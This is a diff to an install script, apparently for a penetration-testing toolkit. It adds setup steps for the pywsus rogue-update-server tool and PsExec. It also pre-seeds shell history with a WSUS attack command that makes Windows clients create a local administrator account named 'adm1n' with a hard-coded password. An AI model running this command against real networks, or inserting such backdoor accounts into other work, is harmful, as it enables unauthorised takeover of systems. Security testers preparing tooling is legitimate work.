@@ -888,6 +888,19 @@ cd $INTERNALS_DIR
 pipx install git+https://github.com/ShutdownRepo/pywhisker.git
 echo "pywhisker -d \$DOMAIN -u \$USER -p \$PASS --target 'user2' --action 'list'" >> ~/.zsh_history
 
+# Pywsus
+cd $INTERNALS_DIR
+git clone https://github.com/GoSecure/pywsus
+cd pywsus
+python3 -m venv .
+source bin/activate
+pip3 install -r requirements.txt
+deactivate
+wget https://download.sysinternals.com/files/PSTools.zip
+unzip PSTools.zip PsExec64.exe
+echo "alias pywsus='$INTERNALS_DIR/pywsus/bin/python3 $INTERNALS_DIR/pywsus/pywsus.py'" >> ~/.zshrc
+echo "python3 pywsus.py --host <your-ip> --port 8530 --executable $INTERNALS_DIR/pywsus/PsExec64.exe --command '/accepteula /s cmd.exe /c \"net user adm1n Password?1011 /add && net localgroup Administrators adm1n /add\"'" >> ~/.zsh_history
+
 # Rcat
 cd $GENERAL_DIR
 wget https://github.com/0xfalafel/rcat/releases/download/0.4/rcat_amd64 -O rcat
